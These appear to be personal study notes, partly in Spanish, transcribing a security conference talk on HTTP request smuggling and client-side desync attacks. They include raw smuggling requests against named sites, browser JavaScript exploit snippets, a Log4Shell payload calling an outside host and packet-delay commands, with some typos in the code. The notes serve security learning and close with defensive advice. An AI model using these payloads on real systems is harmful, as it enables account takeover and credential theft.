en páginas que carguen páginas buscar por offsite redirect

### 2019 VS 2021
After the reborn of request smuggling the solution was to never reuse HTTP 1.1 to avoid false positives
![[Pasted image 20240805194512.png]]
At the same time conection locks the http conection so always reuse http conection
	James Ketle reuse conection and still distinguish genuine vulerabilities from false positives
There's a new paradigm, because this atacked can be launched for the users browser, which didn't require an atacker and didn't requiere that the vulnerable site to have a front-end server.
	"The request is a lie. HTTP request are a useful abstraction, but the harder you try to hold onto thes concept, the less sense these techniques are going to make. At the end of the day, all we are doing is sending a string of bytes and what the server does with that is up to it"
									                  James Kettle

it's all too easy to forget about http connection reuse because http it supposed to be stateless, but sometimes state can creep in.

### First Example
In the fisrt example we got a web application which had a reverse proxy in front and it was set up to let me access sites intended to be public and not to access private sites on their intranet. And it was deciding where to route the request using the host header. but this front-end was only validating the host header of the first request on each tcp connection. (Don't forget that we have differents requests and in http smuggle these are sending over the same TCP connection).
So i could just send a request to the legit site and then gain access to the internal systems.

```Conection state atacks:first-request validation

Get / HTTP/1.1                          HTTP/1.1  200 OK
Host: redacted

GET / HTTP/1.1                          -connection reset-
Host: intranet.redacted
```
```
GET / HTTP/1.1                          HTTP/1.1 200 OK
Host: redacted

GET / HTTP/1.1                         HTTP/1.1 200 OK
Host: intranet.redacted
                                       Internal website
```

### First-request Routing
The last bug is rare, but there's a common variation which i call "first-request routing".
```
POST /pwreset HTTP/1.1                   HTTP/1.1  302 Found
Host: redacted                           Location: /login
```
```
POST /pwreset HTTP/1.1                   HTTP /1.1 421 Misdirected
Host: psres.net
```
```
POST / HTTP/1.1                          HTTP/1.1 200 OK
Host: example.com                        ...

POST /pwreset HTTP/1.1                   HTTP/1.1 302 Found
Host: psres.net                          Location: /login
```
Here, the front-end server looks at the first request to work out which back-end to route it onto, but then it passes all subsequent requests on that connection straight through to the same back-end system. By itself, this behavior is not really a vulnerability, but you can use it to hit any back-end with an arbitrary host header. So you can use that to form par of an exploit chain that would otherwise be impossible. in this example here, i wanna hit the back-end with a poisoned host header so i can trigger a poisoned password reset email
```
Reset your Password: https://psres.net/reset?k=secret
```
but doing that directly isn't possible, because the front-end doesn't know where to route it to. But once again, i just send a legit request first and then follow it up with the attack. And we successfully get a poisoned password reset email, and hopefulle, access to someone's account. So hopefully, that simple technique will come and useful for you.

### Amazon bug
But there's also a broader takeaway here, which is that it's really good to peel away these abstraction sometimes because they can hide behavior that's really quit important. 
Onto request smuggling. Well, you know the deal with this, hopefully, you just make the front-end and back-end disagree about the length of a HTTP request. Use that to apply a malicious prefix shown in orange to the victim's request, and that makes bad things happen to the victim. To encourage this disagreement to happen, you generally obfuscate the transfer and coding header to hide it from one of the servers. So i was a bit puzzled when i found that i could trigger really suspicious behavior on a large number of websites using AWS's Application Load Balancer using this HTTP/2 request. 
![[Pasted image 20240810200436.png]]
```
:method POST
:path /
X
```
If you look at this request, you might wonder where the attack is because this is a legitimate HTTP/2 request. it's spec compliant, there isn't any obfuscation there or anything like that. And yet, somehow this was causing some kind of desync on these websites. After spending quite a while, investigating it as usual, i eventually decided what Amazon must be doing is inexplicably adding a header that said, actually, this message is chunked when they forwarder it onto the back-end, but not actually chunked it. And well, once i knew that, it was easy to turn this into an exploitable desync and hack a bunck of sites. So that was nice. I reported it to Amazon and they fixed it, really quite quickly too. 


| :method    | GET      |
| ---------- | -------- |
| :path      | /        |
| :autorithy | redacted |
| x          |          |

```
POST / HTTP/1.1  
Host: redacted  
Transfer-Encoding: chunked  
  
0  
  
malicious-prefix
```

### CL.TE
But it left the question, well, why was Amazon doing that? Why did that even happen? And i think it's because web browsers always sen a content-length header even when they're using HTTP/2, even though that is not requieres over HTTP/2. And so Amazon just ended up with logic that said, "well, if there isn't a content-length header, i guess it must be chunked." So that was a handy finding. But the real value of it was the takeaway, which is that for request smuggling, you don't necessarily need header obfuscation or any kind of ambiguity. All you need is a server taken by surprise. We're gonna coma back to that shortly. 
![[Pasted image 20240810201828.png]]
Now, let's take a closer look at the connection locked HTTP/1 reques smuggling issue mentioned earlier. So to confirm regular request smuggling, you send two requests. You confirm request effects in response to the second as shown here. And this works great provided you send those two requests over separate connections, but to find a connection lot vulnerability, you have to send them over the same connection like this.
**Conectio 1**
```request
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1                       
Foo: bar
```
```RESPONSE
HTTP/1.1 301 Moved Permanently
```
**Conectio 2**
```request
GET / HTTP/1.1                       
Host: example.com
```
```RESPONSE
HTTP/1.1 404 Not FOund
```
![[Pasted image 20240810202238.png]]
Now here, we're sending and receiving exactly the same bytes as shwon on the previous slide. But now we have a problem because we can no longer tell where the front-end thinks the first request ends. And that means we can't tell if this system is actually vulnerablo or not. The solution here is to realize that these bytes that we're getting back aren't the only information that we have. We also have timing information. If the front-end server thins our messages is chunked, that means it's already starting to generate a response before we send the orange payload (orange payload represented the code injected). So if we pause before sending that payload and check the socket, and we see a response coming back, that tells us they're not using the content-length, they thinks this message is chunked and they're not vulnerable to a CL.TE desync.
```REQUEST
POST / HTTP/1.1
Content-length: 41
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: bar
```
```RESPONSE
HTTP/1.1 301 Moved Permanently
```
![[Pasted image 20240810211713.png]]Meanwhile, if we try to read and don´t get any data back for a few seconds, 
```REQUEST
POST / HTTP/1.1
Content-length: 41
Transfer-Encoding: chunked

0


```
![[Pasted image 20240810211840.png]]
and then the rest of the atack plans out as usual, that proves the front-end must be using the content-length and therefore are actually vulnerable. 
```
POST / HTTP/1.1
Content-length: 41
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: barGET / HTTP/1.1                       
Host: example.com
```
![[Pasted image 20240810212054.png]]
So i took that technique. I automated it and it went scanning, and i found a few things. One of the mildly notable things was, there was a vulnerable system that was vulnerable because they were running a Barracuda's web application firewall in front of IIS. Obviously, it's old news. You put a web application firewall in front of something, it makes it easier to hack, but what was particularly interesting here was, Barracuda had actually issued a patch for this problem, but they hadn't flagged it as like a full on security fix. They just said it was, "oh, just a speculative hardening measure." So as such the client, hadn't bothered to install it and it was vulnerable. (Finding: Barracuda ADC in fron of IIS. Patched in 6.5.0.007)

### CL.0 browser-compatible desync
As usual though, the best desync i found with this technique was the one that initially made absolutely no sense. After extensive testing, i was able to refine the atack sequence into this. 

![[Pasted image 20240810213038.png]]
```REQUEST
POST / HTTP/1.1
Content-length: 41
Transfer-Encoding: chunked

0

xy<GET /hopefully404 HTTP/1.1
H: 
```
Now, there's two thing to unpack here. First off, as you can see, the back-end server is completly ignoring the content-length here. So that means this is a CL.0 desync, which is a rearer attack class that hasn't been widely researched. 
```Taxonomy
TE.CL and CL.TE // clasic request smuggling
H2.CL and H2.TE // HTTP/2 downgrade smuggling
CL.0            // this
H2.0            // implied by CL.0
0.CL and 0.TE   // unexploitable without pipeling
```
![[Pasted image 20240810213250.png]]
Secondly is, well, why are they ignoring that content-length? There's no reason. There's no reason. They're just ignoring it because they feel like it. It never ocurred to me that a server might just arbitrarily ignore the content-length on a completly valid HTTP/1 request. And that has implications. It also left me wondering, given that i found this by acciden with a scanning technique that wasn't even designed to find this, well, how many sites am i gonna find if i go deliberately looking for this type of vulnerability? The answer was a quite a few. My favorite one was amazon.com. 
### H2.0 amazon.com

~~~REQUEST1
POST /b/? HTTP/2
Host: www.amazon.com
Content-Length: 31

GET /favicon.ico HTTP/1.1
X: XGET / HTTP/1.1
Host
~~~
~~~RESPONSE1
HTTP/2 200 OK
Content-Type: text/html
~~~
(Second request concatenated)
~~~RESPONSE2
HTTP/2 200 OK
Content-Type: image/x-icon
~~~
![[Pasted image 20240810213908.png]]
So they ignore the content-length on POST request sent to the path /b. Using this, i got a server side desync so i made a simple proof of concept, which stored random live users HTTP requests, includinf their credentials inside my Amazon wish-list. So i send this request a few times. I reload my wish-list and i've got some other random people session cookies. So i reported that to Amazon. They fixed it at some point. And then i realized that i'd made a terrible mistake because i could've done a much cooler attack. This request exploits a random liver user, right? And the request is a legitimate HTTP request that can be triggered by a web browser. So if i'd used the head technique to execute Javascript in the victim's browser, i could have made every user that got hit by this, spread the attack to 10 other users, thereby making a self-spreading desynchronization worm and compromising every active user on Amazon. So that was a cool finding, missed opportunity too, And also a hint at an entire new attack class.
### Client-Side Desync (CSD)
every desync, every request smuggling vulnerability that we've seen to date has desynchronized the connection between the front-end server and the back-end server. But if you can make a web browser send a request that causes a desync like could on Amazon, then you can target the browser's own connection pool. And that means you can exploit sites that don't have a front-end, back-end architecture. This attack starts with the victim visiting the attacker's website, which sends two requests to the target site. 
![[Pasted image 20240810220223.png]]
The first request desynchronizes the browsers connection to that website. So that the second request triggers a harmful response to go back to the victim and give the attacker control of the victim's account. ![[Pasted image 20240810220340.png]]
To build these attacks, i've adapted the methodology from classic request smuggling. 
![[Pasted image 20240817235606.png]]
```
-                            ┌-> store
DETECT -> CONFIRM -> EXPLORE ├-> chain/pivot
-                            └-> attack
```
![[Pasted image 20240810220505.png]]
The main difference is that our entire exploit here needs to run in our victim's web browser. And that is an environment that's a lot more complex and uncontrolled than a dedicated hacking tool. So it's crucial to periodically take your technique as you've got it working inside your tool and try out in the browser to make sure that it works as expected in the real environment that you want the attack to work in. Tooling wise, i did all of this with custom code,  which i've just released to GitHub, but i also helped design a new Burp Suite feature called send request sequence, which offers similar functionality with a bit of a gentler learning curve. For the target browser, this technique seems to work on all browsers pretty much equally. Personally, i focused on Chrome because Chrome has the best developer tools for building this kind of exploit. 
```
Tool requirements:
- Conetion-reuse visibility & controls
- Content-Length override
- HTTP Request Smugger 2.1 /Turbo Intruder 1.3, Burp Suite {Pro,Comunity} 2022.8
```
```
Browser:
- CSD works similary on all browser tested
- Chrome has the most useful dev tools
```
![[Pasted image 20240810220933.png]]
The first step towards a successful attack is to identify your client-side desync vector. This is a HTTP/1 request with three key properties. First and foremost, the server needs to ignore the content-length of this request. This will typically happen because you've triggered some kind of server error or because you've taken the server by surprise, it just wasn't expecting a POST request to that end point. 
 - 1 Server ingores COntent-Length
	 - Server-error
	 - Surprise factor
- 2 Request can be triggered cross-domain
	 - POST method, no unusual headers
	 - Server doesn't support HTTP/2*
- 3. Server leaves connection open
![[Pasted image 20240810221235.png]]
**Techniques examples**
For example here, this is one of the more effective techniques. I'm just doing a POST request to a static file.  They don't expect it and as such, if this server is vulnerable, they're likely to ignore the fact that i've said, i'm gonna send more content than i actually have. So i've sent content-length five. I've sent one byte of data. If the server replies to this request immediatly, it suggests that they're ignorin the content-length five sent, and they're quite likely to be vulnerable. Secondly, this request needs to be triggerable across domain inside a web browser. So that means you can't use things like head obfuscation and you can't even specify any special headers really. And also, the target server can't advertise support for HTTP/2, because this is an attack that exploits the fact that HTTP/1 is dire and browsers will aggressively prefer to use HTTP/2.
~~~
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Type: text/plain
Content-Length: 5

X
~~~
So the only scenario where a site that uses HTTP/2 is gonna be exploitable via this is if your target victim is using a corporate proxy or something that only supports HTTP/1, which is fairly unlikely. Finally the server needs to leave the connection open, after it's handled this request. So once you've found this, the next step is just take that and see if works inside a real browser, which you can do with some JavaScript that looks comething like this.
~~~
-Disable proxy, open cross-domain HTTPS attacker site
-Open DevTools Network tab, enable Reserve Log & Connection ID

fetch('hrrps://example.com/..%2f', {
	method: 'POST',
	body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
	mode: 'no-cors',
	credentials: 'include'
}).then(() => {
	location = 'https://example.com/'
})
~~~
 So here, we're sending two requests and the first one is gonna desync the connection. And the second request is just a browser navigation, and that should hopefully suffer the consequences of the connection being desync. Now, there's two flags worth mentioning in this attack request. First off, I'm specifying mode no-cors. This is not required for a successful attack, but what it does is it means we can actually see what's happening inside the developer tools. So it's useful for debugging things when things go wrong, which they will do quite a lot. Secondly, I'm specifying credentials include, this is really important because browsers have multiple connection pools per website. And if you poison the wrong connection pool, then i can promise you an extremely frustrating time. So specify that and you'll probably poison the right one. Now, when you run this, if it's successful, you should see two requests in the dev tools with the same connection ID. 
![[Pasted image 20240810224512.png]]
And you should see that the second response has been affected by  the malicious prefix from the first request as shown here. 
```
store
Chain & Pivot


Attack



```
And at this point, it's just time to build an exploit.  This is quite a powerful primitive. So you've got three main options. First off, you can try to store the user's request somewhere where you can later retrieve it, kind of like i did on Amazon. And that works just same as regular server side request smuggling. So i'm not gonna waste any time talking about it in more detail. 
Secondly, there's an all new option, which is chaining and pivoting. So a client-side desync means that you can make your victim's browser send arbitrary bytes to the target website. So what it does is it turns their browser into your personal attack platform and it puts extra attack surface within your reach. 
```
store
Chain & Pivot
- User-Agent:${jndi:ldap://x.oastify.com}
- impossible CSRF
Attack


```
For example, you can make them put Log4Shell payloads, wherever you like, and you can even hit authenticated attack surface using their credentials in a way that's a bit like cross-site request forgery, but not more powerful, because it doesn't have all the limitations that browsers normally put on cross-domain requests. What i'm gonna focus on though is exploiting the end user. 
```
store
Chain & Pivot
- User-Agent:${jndi:ldap://x.oastify.com}
- impossible CSRF
Attack
- Host-header redirects
- HEAD-splicing XSS
- Challenges: presicion, stacked-responses
```
I've tried a lot of different techniques and had the most success with two well-known approaches from server-side request smuggling with certain tweaks applied that we're gonna have a look at in the case  studies. 
### Akamai - detection
```REQUEST1
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 30

GET /robots.txt HTTP/1.1
X: YGET /assets/ HTTP/1.1
Host: wwc.capitalone
```
```RESPONSE1
HTTP/1.1 301 Moved Permanently
```
(RESPONSE 2 CONCATENATED)
```RESPONSE1
HTTP/1.1 200 OK

Allow: /
```
![[Pasted image 20240810230353.png]]
So for our first cas study, we're gonna exploit a straightforward vulnerability that affected a huge number of websites built on the CDN akamai. This attack vector is nice and simple. To cause a desync, you just need to do a POST request that triggers a redirect from the font-end. Confirming this in a browser is also really easy. 

| Name     | Columna 2 | Columna 3 |
| -------- | --------- | --------- |
| /assets  | 301       | 1135468   |
| /assets/ | 200       | 1135468   |
(200 allow)
![[Pasted image 20240810230651.png]]
Here, i've just crafted the prefix so that when the browser follows this redirect from the front-end, it ends up seeing the contents of the robots.txt file. For the exploit, i'm gonna use the head technique.
```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1

GET /X?<script>evil() HTTP/1.1
```
```RESPONSE1
HTTP/1.1 301 Moved Permanently
```
```RESPONSE2
HTTP/1.1 301 Moved Permanently
Location: /assets/
```
```RESPONSE1
HTTP/1.1 404 Not Found
```
![[Pasted image 20240810230822.png]]
Now. if you're not familiar with this technique, it's documented in more detail in last year's presentation on HTTP/2 but the short version is with the head technique, you use the method head to queue up multiple responses that when combined are harmful and let us execute JavaScript from the target site in our victim's browser.
```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1

GET /X?<script>evil() HTTP/1.1
```
![[Pasted image 20240810231042.png]]
 And when you are doing service side request smuggling, it's that simple, but because this is cliend-side, there's a couple of other things that we need to fix first. The first problem is that the initial request coming back to the browser is a 301 redirect. And as such, the browser is just gonna follow that redirec, and that's gonna use the poison connection and mess up our attack. The second problem is the stacked response problem. Whenever Chrome reads in a response from the server, it deliberately does a little overread. It tries read more data than the server said is was gonna send just to see if there's any extra data lying around. And if it sees anything, it quietly dumps de connection and breaks the attack. So fortunately, both issues are easily resolved on Akamai. 
 ```
fetch('https://www.capitalone.ca/assets', {
	method: 'POST',

	// use a cache-buster to delay the response
	body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
		Host: www.capitalone.ca

		GET /x?x=<script>alert(1)</script> HTTP/1.1
		X: Y`,
	credentials: 'include',
	mode: 'cors' //trhpw an error instead od following redirect
}).cath(() => {
	location = 'https://www.capitalone.ca/'
})
 ```
 
![[Pasted image 20240810231837.png]]
So fortunately, both issues are easily resolved on Akamai. So you can fix the stacked response problem by delaying the second response. So it arrives after Chrome does its little check. So in this scenario, i was able to do this by adding a cache, by adding a cache-buster to the request so that it incured a cache miss, went all the way to the back-end, which was slow and old and therefore took ages to respond and meant that it arrived late Chrome didn't see it. The second problem of the browser redirect is easily fixed by changing mode, no cause to mode cause, which means when the browsers sees the redirect, it throws an exception which we can then catch ourselves and continue with our attack, ultimately, leading to a successful exploit.

### Cisco Web VPN -Client-side cache poisoning
For our next target, we'll hit Cisco's web VPN.
~~~
POST / HTTP/1.1
Host: redacted.com
Content-Length: 46

GET /+webvpn/ HTTP/1.1
Host: psres.net
X: YGET /+CSCOE+/win.js HTTP/1.1
Host: redacted.com
~~~
~~~RESPONSE1
HTTP/1.1 200 OK
~~~

```RESPONSE2
HTTP/1.1 301 Moved Permanently
Location: https://psres.net/+webvpn+/index
```
![[Pasted image 20240810235754.png]]
This technique seems to work on lots of web VPNs for some reason. I think it's 'cause they tend to code their own web service for security reasons which backfires. So here, we can trigger a desync, simply by doing a POST request to their homepage.  It couldn't be much easier to be honest. And with that, we can easily trigger a redirect to our website. And in theory, that redirect could let us redirect to JavaScript resource load and let us take full control over the page. But there's a bit of a problem because when a web browser renders a page, it loads all the resources at the same time. And that makes it really quite hard to successfully hijack the correct file. Fortunately, there was an easy solution on this target, because this redirect response is cacheable. So if we poison the connection with our redirect, and then  we tell the browser to navigate to the target JavaScript file, which is /win.js here, then they'll get that redirect back and they'll just get bounced back to our website by the redirect, but they'll also save the redirect in their cache.
So when they learn back on our website, we can send them onwards to the web VPN's login page. 
```REQUEST1
POST / HTTP/1.1
Host: redacted.com
Content-Length: 46

GET /+webvpn+/ HTTP/1.1
Host: psres.net
X: Y
```
```
HTTP/1.1 200 OK
```
```
HTTP/1.1 301 Moved Permanently
Location: https//psres.net/+webvpn+/index
```
```
=> https://redacted.com/+CSCOE+/logon.html
	<script src="https://redacted.com/+CSCOE+/win.js">
```
![[Pasted image 20240811000750.png]]

And when the log in page starts to get rendered, it's gonna try and load that JavaScript file and end up loading our poisoned version from the cache and importing our JavaScript and giving us the user's password. So i reported this to Cisco and they didn't say anything for a while.  And then they said... they're gonna deprecate this product. So they're not gonna fix the issue, but they are issuing a CVE for it. I hope you're not using it. 

### Verisign - fragmented chunk
On verisign.com. 
```
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81
```
~~~
HTTP/1.1 200 OK
~~~

![[Pasted image 20240811001200.png]]
You could trigger a desync using a URL encoded forward slash, Don't ask me how i found that. And unfortunately, that wasn't the only thing a bit unusual about their setup for reasons that i don't have time to explain in any detail. 
To get a working exploit, i had to use the head technique, but i had to do it with a head request that had a body and the body had to be chunked,
```
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81

HEAD / HTTP/1.1
Connection: keep-alive
Transfer-ENcodinf: chunked

34d
```
```
HTTP/1.1 200 ok
```
![[Pasted image 20240811001658.png]]
which meant i had to judge the chunk size, so the follow-up request would perfectly slot inside that chunk and close off the request.
```
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81

HEAD / HTTP/1.1
Connection: keep-alive
Transfer-ENcodinf: chunked

34d
POST / HTTP/1.1
Host: www.verisign.com
Content-Length: 59

0

GET /<script>evil() HTTP/1.1
Host: www.verisign.com
```
```RESPONSE1
HTTP/1.1 200 OK

```
```RESPONSE2
HTTP/1.1 200 OK
Content-Length: 54873
Content-Type: text/html
```
```RESPONSE3
HTTP/1.1 301 Moved Permanently
```
![[Pasted image 20240811001801.png]]
This,unbelievably, did actually work. BUt the interesting thing here, the reason this is worth mantioning is because this approach is exclusive to client-side desync. If you're doing a server-side desync, you don't control what the next request to hit the server is gonna be. So you can't accuerately predict its size. And this technique is basically completly implausible. 
So it's worth bearing in mind that although client-side desync can be quite painful sometimes, you do have options.
### Pulse Secure VPN - an aproach of last resort
**Regular CSD attacks**
- Create a poisoned connection
- Trigger navigation
**Hijacking JS with a non-cacheable redirect**
 - Navigate to target page
 - Guess when the page has loaded
 - Create some poisoned connectios
 - Hope a JS import uses a poisoned connection
![[Pasted image 20240811002320.png]]
Speaking of painful, for our final case study, we're gonna target Pulse Secure VPN. Here, you can do a desync by POST request to the robots.txt file. And just like Cisco's web VPN, they've got a host header, redirect gadget that we'd like to use to hijack a JavaScript import, but this time the redicrect isn't cacheable. So we are in this unpleasant scenario where our attack timing is crucial. And i had to take three steps to make this remotely reliable. 
**Making ir plausible**
 - Pre-connect to normalise target page load time
 - Combine with separate window/tab for multiple attempts
 - Identify page with non-cacheable JS import
![[Pasted image 20240811002725.png]]First off, i pre-connect the victim browser with the target site to reduce the effect of network jitter on the attack timings. This might not make any difference, but i was kinda desperate. Secondly, our attack is gonna fail sometimes. So it's essential that we can have multiple attempts, but a failed attempt leaves the victim on the target website out of our control. So to deal with that, i just run the attack in a separate tab, which just meands we can have as many attempts as we like, except for one other potential problem, which is that if an attack fails and the browser ends up caching the genuine JavaScript file, then we can't poison that file until that cache entry has expired, which could be weeks. But i was able to avoid that issue by finding a page on Pulse Secure's VPN that had a JavaScript import that never got cached because the file they were trying to import didn't actually exist. So by combining all of these, we got a successful attack, which hopefully, looks something like this. 
video>
Yeah, so you can see a tab pops open and then the victim site gets reloaded a couple of times and we get controle. I reported that to VPN and to be honest, i'm not sure what happened. They dind't say anything for ages. And then they said they fixed it, but i can't find the fix. So who knows.

### Paused-based desync
Now, we saw earlier that slowing down and pausing can reveal useful information. And as it turns out, pausing can also crate entire new desync vulnerabilities. 
```
POST / admin HTTP/1.1
Content-Length: 41

```
(wait for response 10s)
![[Pasted image 20240811004106.png]]
To trigger a paused-based desync on a vulnerable server,  you start by sending your headers promising a body, but not sending it and then just waiting. Eventually, you'll get a response. Generally, after like a server timeout is hit. And then, when you finally send the body, they'll threar that as a new request. I initially found this on Varnish. 
```CVE-2022-23959
	if (req.url ~ "^/admin") {
		return (synth(402, "Forbiden"))	
	}
```
VARNISH CACHE Patcher in 7.0.2
![[Pasted image 20240811004350.png]]
And just in case you think that was a really cleaver of me, it was actually, because of multiple bugs in my code combined to trigger this condition. BUt onces i saw it on Varnish, i was like, oh, that's cool, let's go looking for, and i found it works on Apache too which is pretty cool. And it tends to happen when the server generates a response itself instead of forwarding the request to the back-end server or handing it off to the application layer. 
And this single vulnerability enables two distinct attacks. So firt off, we're gonna use it to cause a traditional server side desync. 
![[Pasted image 20240811004846.png]]
Now, for this to work, the front-end server must stream the request to the back-end. So in particular, it must forward the request headers without attempting to buffer the entire request body first. So to find the bug here, well you send your headers and you wait for the timeout, 
(varnis/apache)
(la solicitud toma diez segundos y la respuesta 20)
```
POST / admin HTTP/1.1
Content-Length: 23
```
 ```RESPONSE1
 HTTP/1.1 403 Forbiden

 ```
![[Pasted image 20240811005053.png]]
but you will probably won't realize when the timeout happens on the back-end because the front-end generally won't forward the response onto you until they've seen you send a complete request. So in practice, you need to send your headers, wait until you think of timeout has probably happened  on the back-end and then send the rest and the next request and hopefully, get a successful attack. 
```
POST /admin HTTP/1.1
Content-Length: 23

GET /404 HTTP/1.1
X: YGET / HTTP/1.1
Host: example.com
```
```RESPONSE2
HTTP/1.1 404 Not Found
```
![[Pasted image 20240811005344.png]]
So i've updated Turbo Intruder to add a coople of different ways of saying where in the request you wanna pause
**Turbo Intrude queu() arguments:**
	`pauseTime=20000, pauseBefore=-41, pauseMarker=['GET']`
![[Pasted image 20240811005431.png]]
and how long you want to pause for. So that's it, it's fairly simple. And we migth be wondering, well, what the front-end servers actually stram request like this? To be honest, I couldn't be bothered looking at very many, but it worked on the first one i tried, which was Amazon's Application Load Balancer. 
```
POST /admin HTTP/1.1
Content-Length: 23


```
```
HTTP/1.1 403 Forbidden
```
![[Pasted image 20240811005729.png]]
However, there's one extra catch, which is that they've got a defensive measure. I'll call early response detection. It's a bit like Crhome behavior we saw aerlier, but slightly different. So if Amazons ALB sees the response coming in from the back-end before our request is completed, then, they'll forward that response on, but then they'll dump the connection. They won't reuse it and our attack will fail. 
```
POST /admin HTTP/1.1
Content-Length: 23

GET /404 HTTP/1.1
X: Y
```
```
HTTP/1.1 403 Forbidden
```

![[Pasted image 20240811010044.png]]
Fortunately, this seems to be designed to prevent bugs rather than actual attackers. And there's a really obious race condition in it. So it's quite easy to bypass. All you need to do is identify the back-end timeout and make the orange payload hit the front-end and make that first payload hit the front-end and the time window between the back-end generatin that timeout response and the front-end niticing it. 
```
POST /admin HTTP/1.1
Content-Length: 23

GET /404 HTTP/1.1
X: Y

GET / HTTP/1.1
Host: example.com
```
(diez segundos de envío, diez de respuesta)
```response1
HTTP/1.1 403 Forbidden
```
```response2
HTTP/1.1 404 Not FOund
```

![[Pasted image 20240811010231.png]]
In other words, basically, this attack may take a few attempts, but it's worth it. 
```
POST /admin HTTP/1.1
Content-Length: 23

GET /404 HTTP/1.1
X: Y

GET / HTTP/1.1
Host: example.com
```
(60s)

![[Pasted image 20240811010556.png]]
There's one final challenge that you might encounter, which is more severe. THis is when the front-end and the back-end have the same request timeout configured on ALB that creates a race codition within a race condition and makes life incredibly painful. I thought it might be possible to avoid this issue by resetting the fron-end timeout without resending in the back-end timeout by sendind data that the front-end normalizes and then doesn't send on to the back-end. 
![[Pasted image 20240811010842.png]]
And that might work on some servers, but didn't work on ALB. And after a while of everything i tried failing, even when it was really cool conceptually, i just gave up and i just set a VANILLA atack running. And 66 hours later it was successful. So this is one for the pattient.
### Client-side pause-based desync via MITM

So that was a server-side pause-based desync. An it just leave us with on final question, which is well, is there such a thing as a client-side pause-based desync? Now, I douldn't find a way to make a browsers pause halfway through issuing a request, but SSL and TLS don't stop attackes from delaying our traffic. So there is a potential attack where the attacker triggers a request from your browser that's really big, so it gets split into multiple packets. And then all they have to do is delay the right packet and they can trigger a pause-based client-side desync and exploit you. 
**The theory:**
- Atracker website sends request, padded to cause TCP fragmentation
- MITM identifies the TCP packet containing the request body via the sice
- MITM delays this packet, causing a server timeout & pause-based desync

```
POST /admin HTTP/1.1
Content-Length: 28
```
(60 segundos)
```
GET /404 HTTP/1.1
X: PADPAD
```
(61 segundos)
```
HTTP/1.1 403 Forbidden
```
![[Pasted image 20240811011340.png]]
Now that moght sound quite theoretical. It certainly sound theoretical to me. And this is DEF CON. SO i've made a proof of concept that uses this technique on a default Apache-based website to execute arbitrary JavaScript and kind of break TLS. And now, i'm gonna to live demo it.
```
let form = documet.creatElement('form')
form.method = 'POST'
form.enctype = 'text/pain'
form.action =
'https://x.psres.net:6082/redirect?'+"h".repeat(600) + Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHOST: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script>
HTTP/1.1\r\nHost: x\r\nFoo: bar"+".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
![[Pasted image 20240811011750.png]]
A code on the client-side looks fairly like a regular client-side desync,,  but we've got tons of padding to make the request big  so it gets split into multiple packets, On the attackers middle box,  I used the traffic control facility  with some code like this,  
**Setup**
tc wdisc add dev eth0 root handle 1: prio priomap
**Flag packets to 34.255.5.242 if between 700 and 1300 bytes**
tc filter add dev eth0 protocol ip paren 1:0 prio 1 basic `\`
	match 'u32(u32 0x22ff05f2 0xffffffff at 16)' `\`
		and 'cmp(u16 at 2 layer network gt 0x02bc)' `\`
		and 'cmp(u16 at 2 layer network gt 0x0514)' `\`
	flowid 1:3
**Delay flagged packets by 61 seconds**
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s

that just says delay the packet to the target site  by 61 seconds, if it's in between 700 and 1,300 bytes,  'cause that seems to work. 
As you may guess,  this is not the world's most reliable technique  because you obviously can't decrypt the packets.  They're encrypted.  You just look at how big they are and kind of guess,  but let's have a go and see what happens. 
### Video
video 
Okay, cool.  So I'm gonna make the victim browser,  it's just gonna SOCKS proxy to a box on Amazon  that's being man in the middle  just so the local network doesn't blow things up too much.  It's just a SOCKS proxy.  It's not breaking SSO, anything like that.  Here, we're gonna connect to the attacker machine.  Apologies about the size of the font.  What if I do this?  Yeah, okay.  (keyboard clanking)  Cool, so here we can see this code.  I've got that injects, the delay,  the only change is I'm just doing a six second delay here,  'cause I reduce the server time out  so that the demo doesn't take ages  and I'm running TCP dump on the attacker's box.  So if the attack works,  if the browser decides to send  the correct packet sites for me,  then we are gonna see a few packets go through  and then one large packet being resent over and over.  That's because the victim machine knows it,  it hasn't been received by the server  'cause we're delaying it.  So it's just trying to resend it.  That's just TCP,  but the attacker is delaying all of these resend attempts  until it finally lets them through.  We get a client-side desync and if it's successful,  we'll see an nice pop-up box in the victim browser.  So as you can see,  I've just got the attack code shown earlier here.  I'm gonna hit Execute JS and we'll see what happens.  Okay, great, we can see one packet being resent  a bunch of times and over here in about few seconds maybe,  yes, there we go.  (audience applauding)  
Thanks.  So that was,  oh, so we don't even need the backup video. (chuckles)  All right. So yeah, hope you enjoyed that demo.  That was the final attack of the presentation.  Hopefully, mostly made sense.  
### Defense
Let's talk about defense.  These attacks almost all exploit HTTP/1.  So if you can, I would recommend using HTTP/2 end to end.  That said, if you can't use it end to end,  don't do HTTP/2 downgrading  because that makes things even worse.  Now, secondly,  I don't know how people are gonna react to this,  but my view is, it's really easy to make a HTTP/1 server,  but really difficult to make a HTTP/1 server that's secure.  So I would say don't code your own HTTP server  if at all possible.  That said, software diversity is a healthy thing.  So here's some advice that will help make your server  slightly less prone to these kinds of vulnerabilities  and may be useful if you need to patch  one of these vulnerabilities  and using HTTP/2 end to end is not an option.  
- Use HTTP/2 end to end
	- Don't downgrade/ rewrite HTT/2 request to HTTP/1
- Don't roll your own HTTP server, but if you do:
	- Never assume a request has no body
	- Default to discarding the connection
	- Don't attach state to a connection 
	-  Either support chunked encoding, or reset the connection.
	-  Support HTTP/2
	- 
